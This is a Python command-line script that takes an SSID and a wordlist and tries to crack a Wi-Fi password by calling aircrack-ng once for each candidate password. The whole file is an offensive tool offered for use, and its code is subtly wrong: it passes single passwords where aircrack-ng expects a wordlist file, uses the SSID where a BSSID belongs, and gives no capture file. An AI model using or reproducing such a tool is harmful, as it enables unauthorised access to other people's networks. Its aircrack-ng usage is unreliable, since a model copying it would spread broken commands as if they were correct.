import subprocess
import argparse

def crack_wifi(ssid, wordlist):
    print(f"Cracking Wi-Fi network {ssid}...")
    with open(wordlist, 'r') as file:
        for line in file:
            password = line.strip()
            result = subprocess.run(['aircrack-ng', '-w', password, '-b', ssid], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            if 'Key Found' in result.stdout.decode():
                print(f"Password found: {password}")
                return
    print("No password found.")

def main():
    parser = argparse.ArgumentParser(description='Attempt to crack a Wi-Fi password.')
    parser.add_argument('ssid', type=str, help='The SSID of the Wi-Fi network.')
    parser.add_argument('wordlist', type=str, help='Path to the wordlist file with passwords.')
    args = parser.parse_args()
    
    crack_wifi(args.ssid, args.wordlist)

if __name__ == '__main__':
    main()